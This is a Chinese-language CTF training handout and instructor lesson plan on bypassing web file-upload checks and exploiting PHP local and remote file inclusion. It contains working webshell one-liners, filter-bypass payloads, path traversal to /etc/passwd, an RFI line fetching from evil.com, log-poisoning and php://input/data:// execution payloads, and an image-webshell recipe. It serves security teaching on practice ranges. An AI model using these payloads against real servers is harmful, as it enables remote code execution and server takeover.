# 📤 文件上传与包含全技巧

> Web 方向：文件上传绕过 + 文件包含（LFI/RFI）与伪协议。对应课程 W5。两件事经常组合：上传拿 webshell / 包含读源码或触发执行。

---

## 一、🟢 文件上传绕过（按校验层逐层打）

### 1.1 前端校验（JS 检查后缀）
```text
绕过：浏览器禁用 JS / Burp 抓包改包（先传 jpg 再改成 php）
```

### 1.2 服务端后缀校验

| 校验方式 | 绕过手法 |
|---|---|
| 黑名单（禁 php） | php3/php5/phtml/phar；.htaccess；大小写 PhP；后缀点+空格 `shell.php. `；`shell.php::$DATA`（Win 流）；双写 `shshellphpell` |
| 白名单（只许白名单后缀） | %00 截断（老版 PHP <5.3.4）：`shell.php%00.jpg`；路径拼接截断 |
| MIME 检查（Content-Type） | 抓包改 `image/jpeg` |
| 文件头检查（幻数） | GIF89A 头 + php 代码；`\xFF\xD8\xFF` 伪装 JPG |
| 图片二次渲染 | 在渲染后的图里保留 payload（对比渲染前后插入位置）|
| 条件竞争 | 上传+访问赛跑：脚本不停传 `<?php fputs(...shell.php)?>`，另一脚本不停访问 |
| 解析漏洞 | Apache：`shell.php.abc`（从右往左找已知后缀）；Nginx：`/upload/1.jpg/.php`（cgi.fix_pathinfo）；IIS：`1.asp;.jpg` / 目录解析 `/1.asp/1.jpg` |

### 1.3 🟡 .htaccess / .user.ini（无 PHP 后缀也执行）
```text
.htaccess: AddType application/x-httpd-php .jpg   → 让 .jpg 当 php 跑
.user.ini: auto_prepend_file=shell.jpg             → 当前目录所有 php 自动包含
条件：Apache 支持 htaccess / PHP fastcgi 模式
```

### 1.4 webshell 话术
```php
<?php @eval($_POST['cmd']); ?>          # 一句话（蚁剑连接）
<?php system($_GET['c']); ?>            # GET 型
<?php echo `$_REQUEST[c]`; ?>           # 反引号
# 免杀思路：变量拼接、动态函数、异或构造、加密传输
```

---

## 二、🟢 文件包含（LFI / RFI）

### 2.1 原理与基础
```php
include($_GET['page']);   // page=about.php
# LFI：包含本地文件   ?page=../../../../etc/passwd
# RFI：包含远程 URL   ?page=http://evil.com/shell.txt（需 allow_url_include=On）

# 目录穿越：../ 逐层回退；/etc/passwd 常见回退层级 3-6 层逐个试
```

### 2.2 🟡 PHP 伪协议（核心考点）

| 协议 | 用法 | 作用 |
|---|---|---|
| `php://filter` | `?page=php://filter/read=convert.base64-encode/resource=index.php` | **base64 读源码**（不执行）最常用 |
| `php://input` | POST `<?php system('ls');?>` | 需要 allow_url_include（老环境） |
| `data://` | `?page=data://text/plain,<?php system('ls');?>` | 同上 |
| `zip://` / `phar://` | 包含压缩包内文件 | 配合上传图片马 |
| `file://` | 绝对路径读取 | 默认开 |

```text
php://filter 常用过滤器链：
convert.base64-encode            读源码
convert.iconv.UTF-8.UTF-7        编码变换
zlib.deflate / inflate           压缩
# 进阶：filter chain RCE（不需要 allow_url_include）→ php_filter_chain 生成器
```

### 2.3 🟡 包含日志 Getshell
```text
1. 包含 /var/log/nginx/access.log 或 /var/log/apache2/access.log
2. 在 UA 里写 <?php system($_GET[1]);?>（会转义就先 URL 编码）
3. 包含日志 → 代码执行
其他可包含：/proc/self/environ、session 文件（/tmp/sess_xxx）、邮件日志
```

---

## 三、🟡 上传 + 包含组合拳（图片马）

```text
1. 制作图片马：copy /b normal.jpg + shell.php image.jpg
   （或 GIF89A 头 + php 代码，绕文件头检测）
2. 上传图片马（绕过所有上传检测）
3. 找包含点（?page=upload/image.jpg）或解析漏洞触发执行
4. 蚁剑连接
```

---

## 四、🔴 通用决策树

```text
上传点：
  黑名单？→ 后缀变体/双写/截断
  白名单？→ %00/.htaccess/解析漏洞/条件竞争
  内容检测？→ 文件头伪装/图片马/二次渲染对抗
  全部检测？→ 包含+日志 / phar 反序列化 / 中间件解析

包含点：
  能读文件？→ php://filter 读源码 → 审计 → 二次利用
  能执行？→ php://input / data:// / filter chain RCE
  只有日志？→ 日志包含 getshell
```

---

## 五、练习题单（对应课程 W5）

- BUUCTF Web：[ACTF2020]Upload、[SUCTF]CheckIn（.user.ini）、文件包含系列
- CTFHub：文件上传（无验证/JS/MIME/00 截断/双写/条件竞争）+ 文件包含全分支
- 攻防世界：upload1、file_include
- 工具：蚁剑/冰蝎、php_filter_chain_generator
---

## 🎓 上课流程卡（W5 · 文件上传与包含 · 120 分钟）

> 给讲师：本课是 Web 阶段操作最密的一课（两套攻击面），建议提前 10 分钟到场把靶场开好。核心演示两个：蚁剑连马、php://filter 读源码。

**教学目标**：下课时学员能①独立完成一次绕过后缀检测的 getshell ②用 php://filter 读出靶场源码。

**课前准备**：
- 靶场：上传题 2 道（黑名单一道/白名单一道）+ 包含题 2 道（LFI 一道/filter 读源码一道）
- 学员环境：蚁剑已装、Burp 可用
- **自己预打全部 4 题**（上传题环境敏感，别现场踩坑）

| 时间 | 环节 | 讲师动作 |
|---|---|---|
| 0-10 | 导入 | 演示成品：上传一个"图片" → 蚁剑连上 → 服务器文件全可见。"这节课教的就是从上传点到 getshell 的每一层绕过" |
| 10-40 | 讲解 | §一 按校验层逐层过（黑名单→白名单→MIME→文件头→二次渲染→解析漏洞）；**边讲边在靶场验证一层**（别连讲四层不演示） |
| 40-55 | 演示 | §1.3 .htaccess/.user.ini（讲场景即可）+ §1.4 一句话木马与蚁剑连接演示（学员最兴奋点，慢点讲） |
| 55-75 | 讲解+演示 | §二 包含：LFI 穿越 → php://filter 读源码（**本课第二个核心演示**，base64 出源码时停一下让学员看清）；伪协议表格逐行过 |
| 75-110 | 实操 | 四道题分两组：上传组（黑名单+白名单各一）→ 包含组（LFI+filter）。做完交叉换组。巡场重点：Burp 改包时 Content-Type 位置、%00 截断不生效（新版 PHP 的正常现象，讲清题目版本）、蚁剑连不上（URL/密码字段填错） |
| 110-120 | 收口 | 过 §四 决策树 + 布置作业：CTFHub 上传全分支 |

**学员常见卡点（预判）**：
1. 一句话木马语法抄错 → 提供标准 payload 复制板（别让学员手打引号）
2. 蚁剑连不上 → 90% 是 URL 填到了文件而不是 shell 路径、密码字段与 POST 参数名不一致
3. php://filter 没输出 base64 → 包含点可能加了前缀/后缀（.php），教 %00 或路径拼接测试
4. 上传成功但没解析 → 这是"上传≠执行"的活教材，顺势引出解析漏洞和包含配合

**被问倒的兜底**：免杀 WAF 级对抗 → "这是防御方视角的进阶内容（你们可以在 WAF 绕过篇预习），本课要求是把基础层全部打通——基础没通之前免杀学了也白学"。